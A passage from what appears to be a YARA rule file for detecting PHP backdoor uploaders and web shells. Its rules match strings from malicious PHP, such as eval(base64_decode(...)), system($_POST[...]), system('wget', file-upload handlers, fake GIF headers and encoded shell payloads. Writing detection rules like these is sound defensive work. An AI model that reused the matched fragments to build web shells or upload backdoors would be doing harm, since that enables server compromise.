        $trigger and PR00046 and PR01369 and PR03148 and PR01021 and PR02769 and PR02870 and PR03296 and PR03297
}

private rule PR03298 : trigger
{
    strings:
        $ps0 = "])){echo"
    condition:
        $ps0
}

private rule PR03299 : trigger
{
    strings:
        $ps0 = "(${\"\\x5f\\x46\\x49\\x4c\\x45\\x53\"}["
    condition:
        $ps0
}

rule php_backdoor_uploader_581 : backdoor
{
    strings:
        $trigger = "if(isset(${"
    condition:
        $trigger and PR03298 and PR03299
}

private rule PR03300 : trigger
{
    strings:
        $ps0 = "='domain: '.$_SERVER['name'].'<br>"
    condition:
        $ps0
}

rule php_backdoor_uploader_582 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03300 and PR00046 and PR03148 and PR01021 and PR02769
}

rule php_backdoor_uploader_583 : backdoor
{
    strings:
        $trigger = "error_reporting(0); $cache=preg_split('/;/', file_get_contents(basename($_SERVER['PHP_SELF'])));$cache=end($cache);for($i"
    condition:
        $trigger
}

private rule PR03301 : trigger
{
    strings:
        $ps0 = "$info = pathinfo($filename);"
    condition:
        $ps0
}

rule php_backdoor_uploader_584 : backdoor
{
    strings:
        $trigger = "if(!is_dir($this->upload_target_dir))"
    condition:
        $trigger and PR02208 and PR03301
}

private rule PR03302 : trigger
{
    strings:
        $ps0 = "include("
    condition:
        $ps0
}

private rule PR03303 : trigger
{
    strings:
        $ps0 = "system('rm"
    condition:
        $ps0
}

rule php_backdoor_uploader_585 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01710 and PR03302 and PR03303
}

rule php_backdoor_uploader_586 : backdoor
{
    strings:
        $trigger = "dMHeHpIHcAKzE13bhuFha+a392yW6MuqSSJgxydWtsPEgnarFnsDNu3x5+FvEGZU"
    condition:
        $trigger and PR00029 and PR00265
}

private rule PR03304 : trigger
{
    strings:
        $ps0 = "data:image/"
    condition:
        $ps0
}

private rule PR03305 : trigger
{
    strings:
        $ps0 = "];eval(base64_decode($"
    condition:
        $ps0
}

rule php_backdoor_uploader_587 : backdoor
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR03304 and PR03305 and PR02951
}

private rule PR03306 : trigger
{
    strings:
        $ps0 = ";}else{header(\"HTTP"
    condition:
        $ps0
}

rule php_backdoor_uploader_588 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR03306 and PR01021
}

private rule PR03307 : trigger
{
    strings:
        $ps0 = "basename( $_FILES['uploadedfile']['name']);"
    condition:
        $ps0
}

private rule PR03308 : trigger
{
    strings:
        $ps0 = "has been uploaded"
    condition:
        $ps0
}

rule php_backdoor_uploader_589 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR00046 and PR03148 and PR03307 and PR01021 and PR03308
}

private rule PR03309 : trigger
{
    strings:
        $ps0 = "if (!file_exists($"
    condition:
        $ps0
}

private rule PR03310 : trigger
{
    strings:
        $ps0 = "@unlink ($file);"
    condition:
        $ps0
}

rule php_backdoor_uploader_590 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR03309 and PR03310
}

private rule PR03311 : trigger
{
    strings:
        $ps0 = "DZbVlcNQDET/3UWM8ZopZmY7z8zcfxWbAnSkK83MEejl"
    condition:
        $ps0
}

rule php_backdoor_uploader_591 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR03311
}

private rule PR03312 : trigger
{
    strings:
        $ps0 = "echo hex2bin"
    condition:
        $ps0
}

private rule PR03313 : trigger
{
    strings:
        $ps0 = "\"co\".\"py\""
    condition:
        $ps0
}

rule php_backdoor_uploader_592 : backdoor
{
    strings:
        $trigger = "$_POST["
    condition:
        $trigger and PR03312 and PR01783 and PR03313
}

private rule PR03314 : trigger
{
    strings:
        $ps0 = "$('dr').click(function(dir)"
    condition:
        $ps0
}

private rule PR03315 : trigger
{
    strings:
        $ps0 = "chmod($rename,$chmod);"
    condition:
        $ps0
}

rule php_backdoor_uploader_593 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00046 and PR01468 and PR03314 and PR03315
}

private rule PR03316 : trigger
{
    strings:
        $ps0 = "function functi0n"
    condition:
        $ps0
}

rule php_backdoor_uploader_594 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01021 and PR03316 and PR02141 and PR02245
}

rule php_backdoor_uploader_595 : backdoor
{
    strings:
        $trigger = ":foreach(glob($"
    condition:
        $trigger and PR00046 and PR03148 and PR01021 and PR02769 and PR02870
}

private rule PR03317 : trigger
{
    strings:
        $ps0 = "($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url"
    condition:
        $ps0
}

rule php_backdoor_uploader_596 : backdoor
{
    strings:
        $trigger = "multipart/form-data"
    condition:
        $trigger and PR03317 and PR02388
}

private rule PR03318 : trigger
{
    strings:
        $ps0 = "basename($_FILES['fileToUpload"
    condition:
        $ps0
}

private rule PR03319 : trigger
{
    strings:
        $ps0 = "&& md5($_GET["
    condition:
        $ps0
}

rule php_backdoor_uploader_597 : backdoor
{
    strings:
        $trigger = "<input type"
    condition:
        $trigger and PR00046 and PR03318 and PR01369 and PR03148 and PR03319 and PR01021 and PR02769
}

private rule PR03320 : trigger
{
    strings:
        $ps0 = "$_FILES[\"uploadfile"
    condition:
        $ps0
}

rule php_backdoor_uploader_598 : backdoor
{
    strings:
        $trigger = "fputs("
    condition:
        $trigger and PR03320 and PR01458
}

private rule PR03321 : trigger
{
    strings:
        $ps0 = "move_uploaded_file($_FILES[\"shell\"]"
    condition:
        $ps0
}

rule php_backdoor_uploader_599 : backdoor
{
    strings:
        $trigger = "<input type"
    condition:
        $trigger and PR00046 and PR01369 and PR03321 and PR01021 and PR02769 and PR03296
}

// MANUAL FIX NECESSARY
private rule PR03322 : trigger
{
    strings:
        $ps0 = "if(!empty($_POST["
    condition:
        $ps0
}

rule php_backdoor_uploader_600 : backdoor
{
    strings:
        $trigger = "$_FILES["
        $php_backdoor_uploader_600_r0 = /if\(!empty\(\$_POST\[.[\w]+.\]\)\)[\s]*\{[\s]*move_uploaded_file\(\$_FILES\[.[\w]+.\]\[.[\w]+.\],[\s]*\$_FILES\[/
    condition:
        $trigger and PR01648 and PR03322 and $php_backdoor_uploader_600_r0
}

rule php_backdoor_uploader_601 : backdoor
{
    strings:
        $trigger = "create_function('',base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOw0KZnVuY3Rpb24gbWtmaWxlK"
    condition:
        $trigger
}

private rule PR03323 : trigger
{
    strings:
        $ps0 = ";}else{if(!empty($_POST['new_remote'])){if(!chmod($"
    condition:
        $ps0
}

rule php_backdoor_uploader_602 : backdoor
{
    strings:
        $trigger = "<input type"
    condition:
        $trigger and PR00046 and PR01369 and PR03148 and PR03323 and PR01021 and PR02769 and PR02870
}

rule php_backdoor_uploader_603 : backdoor
{
    strings:
        $trigger = "if($_POST[upload]){if(@copy($_FILES"
    condition:
        $trigger and PR00046 and PR02987
}

private rule PR03324 : trigger
{
    strings:
        $ps0 = "$code_php"
    condition:
        $ps0
}

rule php_backdoor_uploader_604 : backdoor
{
    strings:
        $trigger = "<title>File Uploader</title>"
    condition:
        $trigger and PR03324 and PR00046 and PR00251
}

rule php_backdoor_uploader_605 : backdoor
{
    strings:
        $trigger = "if(isset($_GET[\"bdhax0r"
    condition:
        $trigger
}

private rule PR03325 : trigger
{
    strings:
        $ps0 = "echo \"upload success!\""
    condition:
        $ps0
}

rule php_backdoor_uploader_606 : backdoor
{
    strings:
        $trigger = "<form action=\"<?php echo $_SERVER['PHP_SELF'] . \"?up=up&f=f\";?>\" method=\"post\" enctype=\"multipart/form-data\">"
    condition:
        $trigger and PR03325 and PR00203
}

private rule PR03326 : trigger
{
    strings:
        $ps0 = "->extractTo"
    condition:
        $ps0
}

rule php_backdoor_uploader_607 : backdoor
{
    strings:
        $trigger = "isset"
    condition:
        $trigger and PR03326 and PR01382 and PR02987 and PR02769
}

private rule PR03327 : trigger
{
    strings:
        $ps0 = "@copy($"
    condition:
        $ps0
}

rule php_backdoor_uploader_608 : backdoor
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR02769 and PR01341 and PR02870 and PR03327
}

private rule PR03328 : trigger
{
    strings:
        $ps0 = "ZXZhbChiYXNlNjRfZGVjb2RlKCJKR2t4YVQwblBU"
    condition:
        $ps0
}

rule php_backdoor_uploader_609 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR03328 and PR01398
}

rule php_backdoor_uploader_610 : backdoor
{
    strings:
        $trigger = "$_SERVER[\"DOCUMENT_ROOT\"] . \"/\".@trim($_POST[\"filename\"]) . \".p\";"
    condition:
        $trigger and PR00435
}

private rule PR03329 : trigger
{
    strings:
        $ps0 = "system($c);"
    condition:
        $ps0
}

rule php_backdoor_uploader_611 : backdoor
{
    strings:
        $trigger = "echo\"uploaded:$uploadfilen\";"
    condition:
        $trigger and PR03329
}

private rule PR03330 : trigger
{
    strings:
        $ps0 = "_[0].'ER!'.$"
    condition:
        $ps0
}

rule php_backdoor_uploader_612 : backdoor
{
    strings:
        $trigger = "](uhex($_GET[\"d\"]));"
    condition:
        $trigger and PR00042 and PR03330 and PR00046 and PR00251
}

private rule PR03331 : trigger
{
    strings:
        $ps0 = ": if (is_file(\"{$"
    condition:
        $ps0
}

private rule PR03332 : trigger
{
    strings:
        $ps0 = "(move_uploaded_file($_FILES[\"\\"
    condition:
        $ps0
}

rule php_backdoor_uploader_613 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR03331 and PR03332 and PR02259 and PR01021 and PR02261 and PR02141
}

rule php_backdoor_uploader_614 : backdoor
{
    strings:
        $trigger = "<?php eval(base64_decode(\"ZWNobyAiPGI+Ii5waHBfdW5hbWUoKS4iPC9iPiI7IA0KZWNobyAiPGJyPjxicj4iOw0KZW"
    condition:
        $trigger
}

rule php_backdoor_uploader_615 : backdoor
{
    strings:
        $trigger = "start dont:/  file end .php"
    condition:
        $trigger
}

private rule PR03333 : trigger
{
    strings:
        $ps0 = "echo 'File Download Success && File Locked!';"
    condition:
        $ps0
}

rule php_backdoor_uploader_616 : backdoor
{
    strings:
        $trigger = "curl_init("
    condition:
        $trigger and PR00435 and PR03333
}

rule php_backdoor_uploader_617 : backdoor
{
    strings:
        $trigger = "file_put_contents('error-logs.txt',$log_page);"
    condition:
        $trigger and PR00341
}

private rule PR03334 : trigger
{
    strings:
        $ps0 = "$up_files = $_FILES[\"upfile\"]; $up_ok = 0;"
    condition:
        $ps0
}

rule php_backdoor_uploader_618 : backdoor
{
    strings:
        $trigger = "file_get_contents(base64_decode($_GET["
    condition:
        $trigger and PR00355 and PR03334 and PR00357
}

private rule PR03335 : trigger
{
    strings:
        $ps0 = "system($_POST["
    condition:
        $ps0
}

private rule PR03336 : trigger
{
    strings:
        $ps0 = "<input type=\"file\" name=\"myFile\"><input type=\"submit\" name=\"var\" value=\"crot\">"
    condition:
        $ps0
}

rule php_backdoor_uploader_619 : backdoor
{
    strings:
        $trigger = "echo 'gagal';"
    condition:
        $trigger and PR03335 and PR03336
}

private rule PR03337 : trigger
{
    strings:
        $ps0 = "value='upload' /></form>\"; move_uploaded_file($_FILES['file']"
    condition:
        $ps0
}

private rule PR03338 : trigger
{
    strings:
        $ps0 = "$headers .= 'Bcc: ' . $from . \"\\r\\n\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_620 : backdoor
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR03337 and PR00046 and PR03338
}

rule php_backdoor_uploader_621 : backdoor
{
    strings:
        $trigger = "echo $_FILES['file']['name']."
    condition:
        $trigger and PR00046 and PR03148 and PR02769
}

private rule PR03339 : trigger
{
    strings:
        $ps0 = "substr(md5($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_622 : backdoor
{
    strings:
        $trigger = "strtolower(pathinfo($_FILES["
    condition:
        $trigger and PR03339 and PR01648
}

// MANUAL FIX NECESSARY
private rule PR03340 : trigger
{
    strings:
        $ps0 = "\xe5\x9b\xbe\xe7\x89\x87\xe4\xb8\x8a\xe4\xbc\xa0\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81"
    condition:
        $ps0
}

rule php_backdoor_uploader_623 : backdoor
{
    strings:
        $trigger = "$_POST"
        $php_backdoor_uploader_623_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR03340 and PR00397 and $php_backdoor_uploader_623_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_624 : backdoor
{
    strings:
        $trigger = "echo"
        $php_backdoor_uploader_624_r0 = /GIF[\d]+[^\n]+[\s]*<\?php/
    condition:
        $trigger and PR02887 and $php_backdoor_uploader_624_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_625 : backdoor
{
    strings:
        $trigger = "copy($_FILES"
        $php_backdoor_uploader_625_r0 = /<\?php[\s]*if[\s]*\([\s]*copy[\s]*\([\s]*\$_FILES[^;]+\$_POST/
    condition:
        $trigger and $php_backdoor_uploader_625_r0
}

// MANUAL FIX NECESSARY
private rule PR03341 : trigger
{
    strings:
        $ps0 = "copy("
    condition:
        $ps0
}

rule php_backdoor_uploader_626 : backdoor
{
    strings:
        $trigger = "$_GET["
        $php_backdoor_uploader_626_r0 = /if\s*\(\s*copy\(\$_GET\[.[^\]]+\],\s*\$_GET\[.[^\]]+\]\s*\)\s*\)\s*echo[^;]+;/
    condition:
        $trigger and PR03341 and $php_backdoor_uploader_626_r0
}

private rule PR03342 : trigger
{
    strings:
        $ps0 = ").htmlspecialchars(file_get_contents($_POST[base64_decode("
    condition:
        $ps0
}

rule php_backdoor_uploader_628 : backdoor
{
    strings:
        $trigger = "file_get_contents(base64_decode($_GET["
    condition:
        $trigger and PR03342 and PR00355 and PR00357
}

private rule PR03343 : trigger
{
    strings:
        $ps0 = "]}=getcwd();if(is_writable(${${"
    condition:
        $ps0
}

rule php_backdoor_uploader_629 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02007 and PR00507 and PR03343
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_630 : backdoor
{
    strings:
        $trigger = "move_uploaded_file($_FILES['file']['tmp_name'],"
        $php_backdoor_uploader_630_r0 = /echo\s*['\"]\s*<form\s*method=['\"]POST['\"]\s*enctype=['\"]multipart\/form-data['\"]/
    condition:
        $trigger and PR01780 and PR01021 and $php_backdoor_uploader_630_r0
}

private rule PR03344 : trigger
{
    strings:
        $ps0 = "<form "
    condition:
        $ps0
}

rule php_backdoor_uploader_631 : backdoor
{
    strings:
        $trigger = "<?php echo @copy($_FILES['"
    condition:
        $trigger and PR03344
}

rule php_backdoor_uploader_632 : backdoor
{
    strings:
        $trigger = "CmVjaG8gJzxjZW50ZXI+PGZvbnQgY29sb3I9IlJlZCIgc2l6ZT0iNCI+JzsKLy8vIFNjcmlwdCBVcGxvYWQgQnkgT3NhbWFhIGthYm9vIFxcXAppZihpc3NldCgkX1BPU1RbJ1N1Ym1pdCddKSl7CgkkZmlsZWRpciA9ICIiOyAKCSRtYXhmaWxlID0gJz"
    condition:
        $trigger and PR01398
}

private rule PR03345 : trigger
{
    strings:
        $ps0 = "mail(trim($_POST["
    condition:
        $ps0
}

rule php_backdoor_uploader_633 : backdoor
{
    strings:
        $trigger = "if (isset($_FILES["
    condition:
        $trigger and PR03345 and PR00046 and PR03072 and PR01021 and PR02769
}

private rule PR03346 : trigger
{
    strings:
        $ps0 = "){if(@move_uploaded_file($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_634 : backdoor
{
    strings:
        $trigger = "<input type"
    condition:
        $trigger and PR00046 and PR01369 and PR01021 and PR03346 and PR02769
}

private rule PR03347 : trigger
{
    strings:
        $ps0 = "</br>WordPress is readed.\";"
    condition:
        $ps0
}

private rule PR03348 : trigger
{
    strings:
        $ps0 = "][\"name\"]).\" done well\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_635 : backdoor
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR03347 and PR03348
}

private rule PR03349 : trigger
{
    strings:
        $ps0 = "(md5(md5(md5("
    condition:
        $ps0
}

rule php_backdoor_uploader_636 : backdoor
{
    strings:
        $trigger = "header(\"status: 404 Not Found\");"
    condition:
        $trigger and PR03349
}

private rule PR03350 : trigger
{
    strings:
        $ps0 = "], $_POST[\"filename\"]);"
    condition:
        $ps0
}

rule php_backdoor_uploader_637 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR03350 and PR01648
}

private rule PR03351 : trigger
{
    strings:
        $ps0 = "chmod($lsdir.'/'.$uup['name']["
    condition:
        $ps0
}

rule php_backdoor_uploader_638 : backdoor
{
    strings:
        $trigger = "file_get_contents(base64_decode($_GET["
    condition:
        $trigger and PR00355 and PR03351 and PR00357
}

rule php_backdoor_uploader_fakegif_001 : backdoor
{
    strings:
        $trigger = "GIF89a"
    condition:
        $trigger and PR02388
}

rule php_backdoor_uploader_fpc_001 : backdoor
{
    strings:
        $trigger = "$r=$_REQUEST;@file_put_contents($r["
    condition:
        $trigger
}

rule php_backdoor_uploader_gen_001 : backdoor
{
    strings:
        $trigger = "$ls = wscandir($cwd);"
    condition:
        $trigger and PR01648
}

rule php_backdoor_uploader_gen_002 : backdoor
{
    strings:
        $trigger = "Send beleberda:"
    condition:
        $trigger and PR01648
}

rule php_backdoor_uploader_gen_003 : backdoor
{
    strings:
        $trigger = "fwrite(fopen(dirname(__FILE__).'/'.$r['f'],'w+'),$r['b'])"
    condition:
        $trigger
}

rule php_backdoor_uploader_gen_004 : backdoor
{
    strings:
        $trigger = "chmod ($_REQUEST['p1'], $_REQUEST['p2']);"
    condition:
        $trigger
}

rule php_backdoor_uploader_gen_005 : backdoor
{
    strings:
        $trigger = "<a href=\"?x=x\">upload</a>&nbsp;&nbsp;&nbsp;<a href=\"?x=d\">delete</a>&nbsp;"
    condition:
        $trigger and PR01648
}

private rule PR03352 : trigger
{
    strings:
        $ps0 = "'],base64_decode($_POST['"
    condition:
        $ps0
}

private rule PR03353 : trigger
{
    strings:
        $ps0 = "']){file_put_contents($_POST['"
    condition:
        $ps0
}

rule php_backdoor_uploader_gen_006 : backdoor
{
    strings:
        $trigger = "if($_POST['"
    condition:
        $trigger and PR03352 and PR03353
}

private rule PR03354 : trigger
{
    strings:
        $ps0 = "fwrite($fp, base64_decode($shell)"
    condition:
        $ps0
}

private rule PR03355 : trigger
{
    strings:
        $ps0 = "echo \"Scanning Dork : \".$dork.\"\\n\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_gen_008 : backdoor
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR03354 and PR03355
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_gen_011 : backdoor
{
    strings:
        $trigger = "copy"
        $php_backdoor_uploader_gen_011_r0 = /@copy\(@?\$_FILES\[.\w+.\]\s*\[[('\")]?tmp_name[('\")]?\]\s*,\s*@?\$_FILES\[.\w+.\]\s*\[[('\")]?\w+[('\")]?\]\s*\)\s*;\s*(exit;)?/
    condition:
        $trigger and $php_backdoor_uploader_gen_011_r0
}

private rule PR03356 : trigger
{
    strings:
        $ps0 = "<meta charset=\"utf-8\"><form action=\"?act=save\" method=\"post\">content"
    condition:
        $ps0
}

rule php_backdoor_uploader_gen_014 : backdoor
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR03356
}

private rule PR03357 : trigger
{
    strings:
        $ps0 = "($file != \".\" && $file != \"..\"&& $file != \".htaccess\"&&!strpos($file,\".\")&&!strpos($file,\"log\""
    condition:
        $ps0
}

rule php_backdoor_uploader_gen_015 : backdoor
{
    strings:
        $trigger = "copy($_FILES[\"file\"][\"tmp_name\"]"
    condition:
        $trigger and PR03357
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_gen_016 : backdoor
{
    strings:
        $trigger = "copy($_FILES"
        $php_backdoor_uploader_gen_016_r0 = /echo ['\"](sukses|SUKSES|gagal|GAGAL)[^;]+;[\s\}]+\?>[\s]*\Z/
    condition:
        $trigger and $php_backdoor_uploader_gen_016_r0
}

private rule PR03358 : trigger
{
    strings:
        $ps0 = "aJBfeIMwFMWfLfQ7hFihFjZ979T2bnoZDDZjYqVV1EtQjQkmGZXR7754aH8c"
    condition:
        $ps0
}

rule php_backdoor_uploader_gen_017 : backdoor
{
    strings:
        $trigger = "(gzinflate(str_rot13(base64_decode("
    condition:
        $trigger and PR03358
}

rule php_backdoor_uploader_gen_018 : backdoor
{
    strings:
        $trigger = "echo \"gagal"
    condition:
        $trigger and PR02007
}

private rule PR03359 : trigger
{
    strings:
        $ps0 = "ZWNobyAiPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4NCjxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSd6Yi"
    condition:
        $ps0
}

rule php_backdoor_uploader_gen_018_02 : backdoor
{
    strings:
        $trigger = "eval(base64_decode"
    condition:
        $trigger and PR03359
}

rule php_backdoor_uploader_gen_019 : backdoor
{
    strings:
        $trigger = "PD9waHAKCiRmaWxlcyA9IEAkX0ZJTEVTWyJmaWxlcyJd"
    condition:
        $trigger and PR00397 and PR01382
}

private rule PR03360 : trigger
{
    strings:
        $ps0 = "multipart/form-data\"><input type"
    condition:
        $ps0
}

rule php_backdoor_uploader_gen_020 : backdoor
{
    strings:
        $trigger = "<form "
    condition:
        $trigger and PR02007 and PR02051 and PR03360
}

private rule PR03361 : trigger
{
    strings:
        $ps0 = "system('wget"
    condition:
        $ps0
}

rule php_backdoor_uploader_gen_021 : backdoor
{
    strings:
        $trigger = "echo '<script>top.location"
    condition:
        $trigger and PR03361 and PR00357 and PR01431
}

private rule PR03362 : trigger
{
    strings:
        $ps0 = "if($_POST){ if(@copy($_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_gen_022 : backdoor
{
    strings:
        $trigger = "<form "
    condition:
        $trigger and PR03362
}

rule php_backdoor_uploader_gen_023 : backdoor
{
    strings:
        $trigger = "==\"Upload\"){if(@copy($_FILES["
    condition:
        $trigger and PR03344
}

private rule PR03363 : trigger
{
    strings:
        $ps0 = "if( $_POST['_upl"
    condition:
        $ps0
}

rule php_backdoor_uploader_gen_024 : backdoor
{
    strings:
        $trigger = "<form "
    condition:
        $trigger and PR02007 and PR03363
}

// MANUAL FIX NECESSARY
private rule PR03364 : trigger
{
    strings:
        $ps0 = "'));echo \"aDriv4\".$"
    condition:
        $ps0
}

rule php_backdoor_uploader_gen_025 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_uploader_gen_025_r0 = /file_get_contents\(.http/
    condition:
        $trigger and PR00355 and PR03364 and PR00357 and $php_backdoor_uploader_gen_025_r0
}

private rule PR03365 : trigger
{
    strings:
        $ps0 = "http_"
    condition:
        $ps0
}

private rule PR03366 : trigger
{
    strings:
        $ps0 = "$text"
    condition:
        $ps0
}

private rule PR03367 : trigger
{
    strings:
        $ps0 = "fopen($check"
    condition:
        $ps0
}

rule php_backdoor_uploader_group_001 : backdoor
{
    strings:
        $trigger = "$_SERVER['DOCUMENT_ROOT']"
    condition:
        $trigger and PR03365 and PR01362 and PR03366 and PR03367
}

rule php_backdoor_uploader_POST_002 : backdoor
{
    strings:
        $trigger = "print(md5(123456));echo file_put_contents($_POST["
    condition:
        $trigger
}

rule php_backdoor_uploader_POST_003 : backdoor
{
    strings:
        $trigger = "<br><h3> Server Script Lister"
    condition:
        $trigger
}

rule php_backdoor_uploader_POST_004 : backdoor
{
    strings:
        $trigger = "]));echo md5($_POST[\""
    condition:
        $trigger
}

private rule PR03368 : trigger
{
    strings:
        $ps0 = "$hajar = $_POST["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_005 : backdoor
{
    strings:
        $trigger = "$handle = fopen($file"
    condition:
        $trigger and PR03368
}

private rule PR03369 : trigger
{
    strings:
        $ps0 = "if (fwrite($fp,\"$content\\n\") == FALSE) {exit;}"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_006 : backdoor
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR03369 and PR01479
}

private rule PR03370 : trigger
{
    strings:
        $ps0 = "php echo __FILE__;"
    condition:
        $ps0
}

private rule PR03371 : trigger
{
    strings:
        $ps0 = "if (@md5($_REQUEST["
    condition:
        $ps0
}

private rule PR03372 : trigger
{
    strings:
        $ps0 = "echo $_POST["
    condition:
        $ps0
}

private rule PR03373 : trigger
{
    strings:
        $ps0 = "if (file_put_contents($_POST["
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_007 : backdoor
{
    strings:
        $trigger = "file_get_contents($_POST["
    condition:
        $trigger and PR03370 and PR03371 and PR03372 and PR03373
}

private rule PR03374 : trigger
{
    strings:
        $ps0 = "base64_decode(str_replace(\" \",\"\","
    condition:
        $ps0
}

private rule PR03375 : trigger
{
    strings:
        $ps0 = "file_put_contents($directory.\"/\".$name.\".php\", base64_decode"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_008 : backdoor
{
    strings:
        $trigger = "add_action(\"wp_head\", \"wpdsw_add\");"
    condition:
        $trigger and PR03374 and PR03375
}

private rule PR03376 : trigger
{
    strings:
        $ps0 = "value=\"<?echo(@getcwd());?>\">"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_009 : backdoor
{
    strings:
        $trigger = "echo \"File was succesfully uploaded!\";"
    condition:
        $trigger and PR00507 and PR03376
}

private rule PR03377 : trigger
{
    strings:
        $ps0 = "){echo '<input name=\"userfile[]\""
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_010 : backdoor
{
    strings:
        $trigger = "\";}else{print \"info:"
    condition:
        $trigger and PR03377 and PR01746 and PR01490
}

private rule PR03378 : trigger
{
    strings:
        $ps0 = "UEQ5d2FIQUtaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBrWnBiR1VnVlhCc2IyRmtaWElnWW5rZ1JH"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_011 : backdoor
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR03378 and PR00397
}

private rule PR03379 : trigger
{
    strings:
        $ps0 = "Simple Backdoor</title>"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_012 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02458 and PR00507 and PR03379
}

private rule PR03380 : trigger
{
    strings:
        $ps0 = "@$cp($_FILES['a']['tmp_name"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_013 : backdoor
{
    strings:
        $trigger = "$_POST["
    condition:
        $trigger and PR03371 and PR03380
}

private rule PR03381 : trigger
{
    strings:
        $ps0 = "@$get_theme_mod($_FILES['WP_Error']['tmp_name"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_014 : backdoor
{
    strings:
        $trigger = "$_POST["
    condition:
        $trigger and PR03371 and PR03381
}

private rule PR03382 : trigger
{
    strings:
        $ps0 = "</b></center>\";}}else{echo'<form method=\"POST\" action=\"\" enctype=\"multipart/form-data\"><input type=\"file\" name="
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_016 : backdoor
{
    strings:
        $trigger = "echo\"<center><b>Done ==> $userfile_name"
    condition:
        $trigger and PR01648 and PR03382
}

private rule PR03383 : trigger
{
    strings:
        $ps0 = "$_FILES['file']['name'])) { echo '<b>Upload Complate !!!</b><br>'; } echo '<form action="
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_017 : backdoor
{
    strings:
        $trigger = "$_GET["
    condition:
        $trigger and PR03341 and PR03383
}

private rule PR03384 : trigger
{
    strings:
        $ps0 = "];echo('<textarea style=\"width:100%;height:100%;\" wrap=\"off\">'.$"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_018 : backdoor
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR03384 and PR02051
}

private rule PR03385 : trigger
{
    strings:
        $ps0 = "preg_match("
    condition:
        $ps0
}

private rule PR03386 : trigger
{
    strings:
        $ps0 = "$target_path=basename($_FILES[\"uploadedfile\"][\"name\"]);if(move_uploaded_file($_FILES"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_019 : backdoor
{
    strings:
        $trigger = ">file uploaded</font>"
    condition:
        $trigger and PR00435 and PR03385 and PR01529 and PR03386
}

rule php_backdoor_uploader_POST_020 : backdoor
{
    strings:
        $trigger = "if(file_exists($index)){@chmod($index,0755);}@file_put_contents($index"
    condition:
        $trigger and PR02836
}

private rule PR03387 : trigger
{
    strings:
        $ps0 = "substr(sprintf('%o', fileperms($_POST['path'])), -4)"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_021 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR01392 and PR03387 and PR00357
}

private rule PR03388 : trigger
{
    strings:
        $ps0 = "else { echo '#0~'; }"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_023 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR00507 and PR03388
}

private rule PR03389 : trigger
{
    strings:
        $ps0 = "@unlink($tofile);"
    condition:
        $ps0
}

private rule PR03390 : trigger
{
    strings:
        $ps0 = "='<?php '.$"
    condition:
        $ps0
}

rule php_backdoor_uploader_POST_025 : backdoor
{
    strings:
        $trigger = "@file_put_contents($tofile,"
    condition:
        $trigger and PR01330 and PR03389 and PR03390 and PR01479
}

rule php_backdoor_uploader_POST_026 : backdoor
{
    strings:
        $trigger = "echo \"<a href=$usrfile> $usrfile </a>\";"
    condition:
        $trigger and PR01490
}

private rule PR03391 : trigger
{
    strings:
